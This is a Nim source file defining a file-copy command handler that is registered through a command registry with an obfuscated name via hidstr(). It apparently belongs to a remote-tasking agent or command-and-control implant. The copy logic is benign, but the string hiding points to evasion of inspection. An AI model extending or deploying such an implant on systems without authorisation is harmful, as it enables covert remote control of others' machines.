import std/[os, json, strutils]
import core/types
import commands/registry
import crypto/strenc

proc cpExecute(taskId: string, params: JsonNode, state: AgentState,
               send: SendMsg): TaskResult =
  let src = params{"source"}.getStr("").strip()
  let dst = params{"destination"}.getStr("").strip()
  if src.len == 0 or dst.len == 0:
    return TaskResult(output: "Error: source and destination required",
                      status: "error", completed: true)

  let srcFull = if isAbsolute(src): src else: state.cwd / src
  let dstFull = if isAbsolute(dst): dst else: state.cwd / dst
  try:
    copyFile(srcFull, dstFull)
    return TaskResult(output: "Copied: " & srcFull & " -> " & dstFull,
                      status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initCp*() =
  register(hidstr("cp"), cpExecute)
